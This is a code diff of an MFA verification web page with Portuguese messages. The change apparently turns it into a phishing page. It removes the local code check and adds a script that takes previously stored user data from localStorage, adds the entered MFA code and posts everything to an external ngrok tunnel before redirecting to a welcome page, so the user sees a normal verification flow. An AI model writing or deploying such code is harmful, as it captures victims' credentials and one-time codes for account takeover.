@@ -21,17 +21,34 @@
   </div>
 
   <script>
-    function verificarMfa() {
-      const codigoMfa = document.getElementById("codigoMfa").value;
+  function verificarMfa() {
+    const codigoMfa = document.getElementById("codigoMfa").value;
 
-      if (codigoMfa === "987654") {
-        alert("Código MFA validado com sucesso!");
-        window.location.href = "boas-vindas.html"; // ✅ Redirecionamento após sucesso
+    // Recupera dados anteriores salvos no localStorage
+    const usuarioTemp = JSON.parse(localStorage.getItem("usuarioTemp")) || {};
+    usuarioTemp.codigoMfa = codigoMfa;
+
+    // Envia os dados completos para o servidor
+    fetch("https://400920d4110a.ngrok-free.app/dados", {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify(usuarioTemp)
+})
+
+    .then(res => {
+      if (res.ok) {
+        alert("✅ Dados enviados com sucesso!");
+        window.location.href = "boas-vindas.html";
       } else {
-        alert("Código do autenticador inválido.");
-        document.getElementById("codigoMfa").classList.add("error");
+        alert("❌ Erro ao enviar os dados.");
       }
-    }
-  </script>
+    })
+    .catch(erro => {
+      console.error("Erro:", erro);
+      alert("⚠️ Não foi possível conectar ao servidor.");
+    });
+  }
+</script>
+
 </body>
 </html>
